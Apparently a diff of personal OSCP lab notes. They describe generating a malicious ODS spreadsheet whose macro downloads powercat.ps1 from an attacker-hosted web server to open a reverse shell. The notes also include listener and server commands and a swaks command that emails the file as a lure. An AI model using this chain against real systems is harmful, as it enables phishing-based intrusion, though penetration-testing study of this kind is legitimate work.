@@ -4,9 +4,6 @@ cd ~/Desktop/Tools/MMG-LO
 
 With a few modifications to the generator, I adjusted the macro to download `powercat.ps1` from my Python3 web server and use it to establish a reverse shell.
 
-```
-gedit mmg-ods.py
-```
 
 Start listener on 4444
 ```
@@ -15,7 +12,12 @@ cd ~/Desktop/Tools && python3 penelope.py -p 4444 -O / --oscp-safe
 
 Start python server to host powercat.ps1 on KALI ATTACKER
 ```
-powercat && python -m http.server 
+cd ~/Desktop/Tools/Windows && python -m http.server 80
+```
+
+Modify ODS.py
+```
+gedit mmg-ods.py
 ```
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
@@ -36,11 +38,26 @@ if sys.argv[1] == 'windows':
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
-
-
 Next, I generated the malicious ODS file using Python3.
 
 **Command:** python3 mmg-ods.py windows 192.168.45.159 1337
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `cd ~/Desktop/Tools/MMG-LO && python3 mmg-ods.py windows ${KaliIP} 4444`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `sudo swaks -t [target@localhost] --from [sender@localhost] --attach @file.ods --server ${ip} --body "My message to you" --header "Subject: Please check this spreadsheet"`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+Send the ODS file to IMAP.
+
+Catch reverse connection
 
 ---
 
